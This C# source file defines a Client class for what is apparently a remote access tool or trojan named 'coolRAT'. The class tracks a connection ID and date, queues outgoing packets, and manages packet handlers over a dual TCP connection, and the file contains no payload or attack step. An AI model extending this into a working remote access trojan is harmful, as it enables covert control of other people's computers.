using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;
using static coolRAT.Libs.Connections.DualTcpConnection;

namespace coolRAT.Libs
{
    public class Client
    {
        public Guid UniqueId;
        public DateTime ConnectionDate;
        public DualTcpConnection Connection;

        public Client(Guid uniqueId)
        {
            UniqueId = uniqueId;
            ConnectionDate = DateTime.Now;
            Connection = new DualTcpConnection();
        }

        public void SendPacket(Packet packet)
        {
            Connection.OutgoingConnection.QueueSendPacket(packet);
        }

        public void RegisterPacketHandler(string Type, PacketReceivedHandler handler, bool overrideExisting = true)
        {
            if (Connection.PacketReceiverSubscriptions.ContainsKey(Type) && !overrideExisting) return;
            else
                Connection.PacketReceiverSubscriptions.Remove(Type);
            Connection.PacketReceiverSubscriptions.Add(Type, handler);
        }

        public void DeregisterPacketHandler(string Type)
        {
            if (Connection.PacketReceiverSubscriptions.ContainsKey(Type))
                Connection.PacketReceiverSubscriptions.Remove(Type);
        }
    }
}
